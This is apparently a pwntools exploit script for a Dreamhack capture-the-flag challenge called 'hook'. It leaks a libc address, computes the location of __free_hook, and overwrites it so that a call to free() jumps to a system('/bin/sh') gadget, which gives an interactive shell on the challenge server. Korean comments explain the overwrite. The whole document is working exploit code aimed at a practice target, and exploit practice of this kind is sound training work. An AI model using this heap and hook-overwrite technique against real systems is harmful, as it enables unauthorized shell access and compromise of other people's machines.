from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
def slog(name, addr):	return success(": ".join([name, hex(addr)]))

# Local
"""
p = process("./hook")
libc = ELF("./libc.so.6")
"""

# Online
PORT = int(input("Port: "))
HOST = int(input("Host: "))
p = remote("host" + str(HOST) + ".dreamhack.games", PORT)
libc = ELF("./libc.so.6")

elf = ELF("./hook")

p.recvuntil("stdout: ")
stdout_addr = int(p.recv(14), 16)
slog("stdout_addr", stdout_addr)
libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]
slog("libc_base", libc_base)
slog("free_hook", free_hook)

p.recvuntil("Size: ")
p.sendline("400")
p.recvuntil("Data: ")
p.sendline(p64(free_hook) + p64(0x400a11))
# 문제를 일으키는 free 부분을 다른 부분으로 넘겨버림
# ptr[1]의 주소에 system("/bin/sh")를 가리키는 코드 주소를 넣어
# 바로 코드 상의 system("/bin/sh")로 이어지게 만든다

p.interactive()
